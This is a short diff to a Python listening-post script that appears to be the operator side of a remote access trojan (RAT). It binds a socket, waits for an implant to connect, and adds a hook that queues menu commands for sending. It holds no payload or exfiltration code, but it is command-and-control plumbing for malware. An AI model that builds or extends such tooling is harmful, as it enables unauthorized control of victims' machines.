@@ -5,7 +5,7 @@ import menu
 import sys
 from modules import *
 from modules import mod_funcs
-from globals import rat_ctx
+from globals import ctx
 
 def main():
     parser = argparse.ArgumentParser(description='LP options')
@@ -22,8 +22,6 @@ def main():
     for module in mod_funcs:
         setattr(type(cmd_menu), 'do_' + module, globals()[module].entrypoint)
 
-    # TODO Build out rat_ctx, need to track module ids
-
     print(f"Waitng for connection on {args.ip}:{args.port}")
     listen_sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
     listen_sock.bind((args.ip, args.port))
@@ -38,6 +36,8 @@ def main():
     worker_thread = worker.Worker(conn[0])
     worker_thread.start()
 
+    cmd_menu.postcmd = process_command
+
     try:
         cmd_menu.cmdloop()
 
@@ -45,6 +45,12 @@ def main():
         worker_thread.stop = True
         sys.exit(-1)
     
+def process_command(stop, data):
+    ''' Function to add commands to send queue after issuance'''
+
+    print("Processing command")
+    ctx.send_queue.put(data)
+    return stop
 
 if __name__ == '__main__':
     main()
